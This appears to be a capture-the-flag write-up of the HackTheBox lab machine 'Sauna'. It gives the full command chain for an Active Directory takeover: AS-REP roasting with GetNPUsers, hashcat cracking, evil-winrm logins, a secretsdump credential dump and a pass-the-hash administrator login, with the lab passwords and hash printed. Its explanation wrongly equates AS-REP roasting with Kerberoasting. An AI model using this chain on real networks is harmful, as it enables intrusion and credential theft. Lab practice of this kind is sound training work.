---
description: https://app.hackthebox.com/machines/229
---

# 🌋 Sauna

<figure><img src="../../../.gitbook/assets/image (509).png" alt=""><figcaption></figcaption></figure>

First, we do a Nmap to reveal the Domain's name:

<figure><img src="../../../.gitbook/assets/image (510).png" alt=""><figcaption></figcaption></figure>

then we go for a gobuster looking for HTML pages:

```
gobuster dir -u http://10.129.207.238 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html
```

and find an about page with names of employees:

<figure><img src="../../../.gitbook/assets/image (511).png" alt=""><figcaption></figcaption></figure>

Let's try enumerating with some common enterprise naming methodology like fsmith or sdriver:

```
GetNPUsers.py egotistical-bank.local/fsmith -no-pass
```

* **`GetNPUsers.py`:** This is the name of the Python script from the Impacket toolkit that is being executed. It is used for extracting TGT hashes.
* **`egotistical-bank.local/fsmith`:** This parameter specifies the target user account for which the TGT hash is to be extracted. In this case, the user account is "fsmith" in the domain "egotistical-bank.local."
* **`-no-pass`:** This parameter indicates that no password will be provided during the request. Kerberoasting attacks involve requesting TGTs for service accounts without providing their passwords. The attack relies on weak encryption used for service tickets.

Lucky guess because it was the only one that was working:

<figure><img src="../../../.gitbook/assets/image (512).png" alt=""><figcaption></figcaption></figure>

after looking for the hash mode number (18200) we can launch our hashcat command:

```
hashcat -m 18200 -a 0 fsmithhash.txt /usr/share/wordlists/rockyou.txt 
```

<figure><img src="../../../.gitbook/assets/image (513).png" alt=""><figcaption></figcaption></figure>

So we got ourselves valid credentials:

connect with evil-winrm:

don't forget to put sauna.htb in /etc/hosts

```
evil-winrm -i sauna.htb -u fsmith -p 'Thestrokes23'
```

<figure><img src="../../../.gitbook/assets/image (514).png" alt=""><figcaption></figcaption></figure>

Now we need to enumerate, so download winPEAS on your local machine and to upload it to your shell just do:

```
upload winPEASx64.exe
```

<figure><img src="../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

while going through the winPEAS output, we encounter some interesting stuff:

```
Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption><p>Free Credentials </p></figcaption></figure>

so now time to dump:

```
secretsdump.py egotistical-bank.local/svc_loanmgr:'Moneymakestheworldgoround!'@sauna.htb
```

<figure><img src="../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

Bingo, we get admin hash

so now it's a free ride to get an admin shell:

```
evil-winrm -i 10.129.95.180 -u administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

:tada:
